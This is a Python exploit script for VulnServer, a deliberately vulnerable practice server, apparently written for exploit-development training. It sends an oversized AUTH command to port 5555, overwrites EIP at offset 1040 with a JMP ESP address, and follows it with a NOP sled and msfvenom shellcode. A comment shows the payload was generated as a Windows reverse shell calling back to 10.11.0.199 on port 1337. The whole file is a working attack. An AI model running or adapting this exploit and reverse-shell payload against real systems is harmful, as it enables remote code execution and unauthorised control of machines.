#!/usr/bin/python
#---------------------------------------------------------------------------------------------#
# Software      = VulnServer                                                                  #
# Download Link = https://github.com/stephenbradshaw/vulnserver                               #
# Date          = 9/13/2017                                                                   #
# Author        = @ihack4falafel                                                              #
# Tested on     = Windows 7 - Professional N SP1                                              #
# EIP Offset    = 1040                                                                        #
# Badchars      = None                                                                        #
# RET Address   = 0x65d11d71 : "\xFF\xE4" | [VulnServer.exe]                                  #
# Usage         = python exploit.py <target IP>                                               #        
#---------------------------------------------------------------------------------------------#

import sys
import socket
import time
import struct
import subprocess

#---------------#---------#  
W  = '\033[0m'  # White   #
R  = '\033[31m' # Red     #
G  = '\033[32m' # Green   #
O  = '\033[33m' # Orange  #
B  = '\033[34m' # Blue    #
P  = '\033[35m' # Purple  #
C  = '\033[36m' # Cyan    #
M  = '\033[35m' # Magenta #
Y  = '\033[33m' # Yellow  #
#---------------#---------#


if len(sys.argv) < 2:
  print Y+ "Usage               :" + P+  " python exploit.py <target IP>" +W
  print Y+ "Example             :" + P+  " python exploit.py 127.0.0.1  " +W
  sys.exit(0)

HOST     = sys.argv[1]
  
#-------------------------------------------------------------------------------------------------------#
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.199 LPORT=1337 -b "\x00\x0a" -f python -v payload #
#-------------------------------------------------------------------------------------------------------#

payload =  ""
payload += "\xdb\xca\xba\x3a\xb9\x98\x21\xd9\x74\x24\xf4\x5e"
payload += "\x2b\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\x6c"
payload += "\xaa\x7a\xd4\x6c\x24\xf8\x17\x8c\xb5\x9d\x9e\x69"
payload += "\x84\x9d\xc5\xfa\xb7\x2d\x8d\xae\x3b\xc5\xc3\x5a"
payload += "\xcf\xab\xcb\x6d\x78\x01\x2a\x40\x79\x3a\x0e\xc3"
payload += "\xf9\x41\x43\x23\xc3\x89\x96\x22\x04\xf7\x5b\x76"
payload += "\xdd\x73\xc9\x66\x6a\xc9\xd2\x0d\x20\xdf\x52\xf2"
payload += "\xf1\xde\x73\xa5\x8a\xb8\x53\x44\x5e\xb1\xdd\x5e"
payload += "\x83\xfc\x94\xd5\x77\x8a\x26\x3f\x46\x73\x84\x7e"
payload += "\x66\x86\xd4\x47\x41\x79\xa3\xb1\xb1\x04\xb4\x06"
payload += "\xcb\xd2\x31\x9c\x6b\x90\xe2\x78\x8d\x75\x74\x0b"
payload += "\x81\x32\xf2\x53\x86\xc5\xd7\xe8\xb2\x4e\xd6\x3e"
payload += "\x33\x14\xfd\x9a\x1f\xce\x9c\xbb\xc5\xa1\xa1\xdb"
payload += "\xa5\x1e\x04\x90\x48\x4a\x35\xfb\x04\xbf\x74\x03"
payload += "\xd5\xd7\x0f\x70\xe7\x78\xa4\x1e\x4b\xf0\x62\xd9"
payload += "\xac\x2b\xd2\x75\x53\xd4\x23\x5c\x90\x80\x73\xf6"
payload += "\x31\xa9\x1f\x06\xbd\x7c\x8f\x56\x11\x2f\x70\x06"
payload += "\xd1\x9f\x18\x4c\xde\xc0\x39\x6f\x34\x69\xd3\x8a"
payload += "\xdf\x9c\x2f\x94\xd8\xc9\x2d\x94\xe3\x30\xbb\x72"
payload += "\x81\x52\xed\x2d\x3e\xca\xb4\xa5\xdf\x13\x63\xc0"
payload += "\xe0\x98\x80\x35\xae\x68\xec\x25\x47\x99\xbb\x17"
payload += "\xce\xa6\x11\x3f\x8c\x35\xfe\xbf\xdb\x25\xa9\xe8"
payload += "\x8c\x98\xa0\x7c\x21\x82\x1a\x62\xb8\x52\x64\x26"
payload += "\x67\xa7\x6b\xa7\xea\x93\x4f\xb7\x32\x1b\xd4\xe3"
payload += "\xea\x4a\x82\x5d\x4d\x25\x64\x37\x07\x9a\x2e\xdf"
payload += "\xde\xd0\xf0\x99\xde\x3c\x87\x45\x6e\xe9\xde\x7a"
payload += "\x5f\x7d\xd7\x03\xbd\x1d\x18\xde\x05\x2d\x53\x42"
payload += "\x2f\xa6\x3a\x17\x6d\xab\xbc\xc2\xb2\xd2\x3e\xe6"
payload += "\x4a\x21\x5e\x83\x4f\x6d\xd8\x78\x22\xfe\x8d\x7e"
payload += "\x91\xff\x87"

#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = "AUTH "           #
# buffer = AAA...........AAA #
# buffer = EIP               #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#


buffer =  "AUTH "
buffer += "A" * 1040
buffer += struct.pack('<L', 0x65d11d71)
buffer += "\x90" * 20
buffer += payload
buffer += "B" * (1395-1040-4-20-len(payload))


try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, 5555))
  print G+ "[+]" +W + " Connected to VulnServer Server with IP: %s and port: 5555" %(HOST)
  print G+ "[+]" +W + " Sending %s bytes of evil payload" %len(buffer)
  time.sleep(2)
  s.send(buffer)
  data = s.recv(1024)
  print G+ "[+]" + P+ " Incoming shell on port 1337" + Y+ " <(^,^)>" +W

except Exception,msg:
  print R+ "[-]" + P+ " Could not connect to VulnServer Server" + Y+ " (._.)" +W
  sys.exit(0)
